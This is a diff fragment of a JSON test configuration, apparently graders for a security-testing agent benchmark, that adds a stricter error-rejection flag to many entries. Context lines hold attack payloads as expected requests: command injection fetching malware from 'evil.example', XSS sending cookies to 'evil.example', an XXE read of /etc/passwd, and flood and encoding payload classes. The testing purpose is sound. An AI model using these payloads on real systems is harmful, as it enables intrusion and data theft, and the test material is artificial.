             "minimum_dispatches": 1,
             "expected_statuses": [200, 201, 204, 301, 302, 307, 308, 400, 401, 404, 405, 422]
           }
-        ]
+        ],
+        "reject_unmatched_errors": true
       }
     },
     {
@@ -17485,7 +17608,8 @@
               "user-agent": "spol5-verify"
             }
           }
-        ]
+        ],
+        "reject_unmatched_errors": true
       }
     },
     {
@@ -17593,7 +17717,8 @@
             "payload_class": "http-flood",
             "minimum_dispatches": 20
           }
-        ]
+        ],
+        "reject_unmatched_errors": true
       }
     },
     {
@@ -19230,7 +19355,8 @@
             "minimum_dispatches": 1,
             "expected_statuses": [200, 201, 204, 301, 302, 307, 308, 400, 401, 404, 405, 422]
           }
-        ]
+        ],
+        "reject_unmatched_errors": true
       }
     },
     {
@@ -20623,7 +20749,8 @@
               "q": "test"
             }
           }
-        ]
+        ],
+        "reject_unmatched_errors": true
       },
       "tool_contract": {
         "requirements": [
@@ -21050,7 +21177,8 @@
               "query": "%3Bls%20-la"
             }
           }
-        ]
+        ],
+        "reject_unmatched_errors": true
       }
     },
     {
@@ -21447,7 +21575,8 @@
             "minimum_dispatches": 1,
             "body_exact": "input=%26%2360script%26%2362alert%281%29%26%2360/script%26%2362"
           }
-        ]
+        ],
+        "reject_unmatched_errors": true
       }
     },
     {
@@ -21618,7 +21747,8 @@
             "payload_class": "overlong-utf8",
             "minimum_dispatches": 1
           }
-        ]
+        ],
+        "reject_unmatched_errors": true
       }
     },
     {
@@ -21956,7 +22086,8 @@
               "content-type": "application/json"
             }
           }
-        ]
+        ],
+        "reject_unmatched_errors": true
       }
     },
     {
@@ -22219,7 +22350,8 @@
               "decode": "true"
             }
           }
-        ]
+        ],
+        "reject_unmatched_errors": true
       }
     },
     {
@@ -22410,7 +22542,8 @@
               "transfer-encoding": "chunked"
             }
           }
-        ]
+        ],
+        "reject_unmatched_errors": true
       }
     },
     {
@@ -22667,7 +22800,8 @@
               "content-type": "application/xml;charset=utf-7"
             }
           }
-        ]
+        ],
+        "reject_unmatched_errors": true
       }
     },
     {
@@ -22904,7 +23038,8 @@
             },
             "expected_statuses": [200, 201, 204, 301, 302, 307, 308, 400, 401, 405, 409, 410, 415, 422, 500]
           }
-        ]
+        ],
+        "reject_unmatched_errors": true
       },
       "tool_contract": {
         "requirements": [
@@ -23303,7 +23438,8 @@
             "body_exact": "txtName=attacker&mtxMessage=%22%3E%3Cimg%20src%3Dx%20onerror%3Dfetch%28%22https%3A//evil.example/steal%3Fc%3D%22%2Bdocument.cookie%29%3E&btnSign=Sign+Guestbook",
             "expected_statuses": [200, 201, 204, 301, 302, 307, 308, 400, 401, 405, 409, 410, 415, 422, 500]
           }
-        ]
+        ],
+        "reject_unmatched_errors": true
       },
       "tool_contract": {
         "requirements": [
@@ -23582,7 +23718,8 @@
             "body_exact": "ip=127.0.0.1%3B%20wget%20http%3A//evil.example/malware%20-O%20/tmp/malware&Submit=Submit",
             "expected_statuses": [200, 201, 204, 301, 302, 307, 308, 400, 401, 405, 409, 410, 415, 422, 500]
           }
-        ]
+        ],
+        "reject_unmatched_errors": true
       }
     },
     {
@@ -24568,7 +24705,8 @@
             "minimum_dispatches": 1,
             "expected_statuses": [200, 201, 204, 301, 302, 307, 308, 400, 401, 405, 409, 410, 415, 422, 500, 404]
           }
-        ]
+        ],
+        "reject_unmatched_errors": true
       }
     },
     {
@@ -24596,7 +24734,8 @@
             },
             "expected_statuses": [200, 201, 204, 301, 302, 307, 308, 400, 401, 405, 409, 410, 415, 422, 500]
           }
-        ]
+        ],
+        "reject_unmatched_errors": true
       },
       "tool_contract": {
         "requirements": [
@@ -24634,7 +24773,8 @@
             },
             "expected_statuses": [200, 201, 204, 301, 302, 307, 308, 400, 401, 405, 409, 410, 415, 422, 500]
           }
-        ]
+        ],
+        "reject_unmatched_errors": true
       },
       "tool_contract": {
         "requirements": [
@@ -24781,7 +24921,8 @@
             "body_exact": "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><login><username>&xxe;</username><password>password</password></login>",
             "expected_statuses": [200, 201, 204, 301, 302, 307, 308, 400, 401, 405, 409, 410, 415, 422, 500, 404]
           }
-        ]
+        ],
+        "reject_unmatched_errors": true
       }
     },
     {
@@ -24965,7 +25106,8 @@
             },
             "expected_statuses": [200, 201, 204, 301, 302, 307, 308, 400, 401, 405, 409, 410, 415, 422, 500, 404]
           }
-        ]
+        ],
+        "reject_unmatched_errors": true
       }
     },
     {
@@ -25095,7 +25237,8 @@
             },
             "expected_statuses": [200, 201, 204, 301, 302, 307, 308, 400, 401, 405, 409, 410, 415, 422, 500]
           }
-        ]
+        ],
+        "reject_unmatched_errors": true
       }
     },
     {
@@ -25208,7 +25351,8 @@
             },
             "expected_statuses": [200, 201, 204, 301, 302, 307, 308, 400, 401, 405, 409, 410, 415, 422, 500, 404]
           }
-        ]
+        ],
+        "reject_unmatched_errors": true
       }
     },
     {
